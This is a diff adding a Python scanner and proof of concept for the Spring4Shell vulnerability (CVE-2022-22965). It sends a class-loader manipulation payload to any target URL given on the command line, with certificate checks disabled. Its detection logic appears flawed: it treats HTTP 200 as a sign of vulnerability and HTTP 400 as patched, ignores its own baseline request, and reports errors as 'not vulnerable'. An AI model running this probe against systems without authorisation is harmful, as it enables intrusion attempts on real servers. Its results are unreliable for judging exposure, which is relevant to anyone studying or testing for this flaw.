@@ -1,0 +1,71 @@
+#!/usr/bin/env python3
+"""
+Spring4Shell (CVE-2022-22965) Scanner and PoC
+Affects Spring Framework on JDK 9+
+"""
+import requests
+import sys
+import urllib3
+
+urllib3.disable_warnings()
+
+def check_spring4shell(target_url):
+    """Check if target is vulnerable to Spring4Shell"""
+
+    # Payload to modify class loader properties
+    payload = {
+        "class.module.classLoader.DefaultAssertionStatus": "true"
+    }
+
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 Spring4Shell Scanner"
+    }
+
+    try:
+        # First, try a normal request to establish baseline
+        baseline = requests.get(target_url, verify=False, timeout=10)
+
+        # Send the exploit payload
+        response = requests.post(
+            target_url,
+            data=payload,
+            headers=headers,
+            verify=False,
+            timeout=10
+        )
+
+        if response.status_code == 200:
+            print(f"[+] Target accepted payload - may be vulnerable")
+            print(f"[*] Response length: {len(response.text)}")
+            return True
+        elif response.status_code == 400:
+            print(f"[-] Target returned 400 - likely patched or not vulnerable")
+            return False
+        else:
+            print(f"[?] Unexpected response: {response.status_code}")
+            return None
+
+    except requests.exceptions.ConnectionError:
+        print(f"[-] Connection failed to {target_url}")
+        return None
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return None
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <target_url>")
+        print("Example: python3 spring4shell.py http://target:8080/app")
+        sys.exit(1)
+
+    target = sys.argv[1]
+    print(f"[*] Checking {target} for Spring4Shell vulnerability...")
+
+    result = check_spring4shell(target)
+
+    if result:
+        print("\n[!] Target may be VULNERABLE to Spring4Shell!")
+        print("[*] Further manual testing recommended")
+    else:
+        print("\n[-] Target does not appear vulnerable")
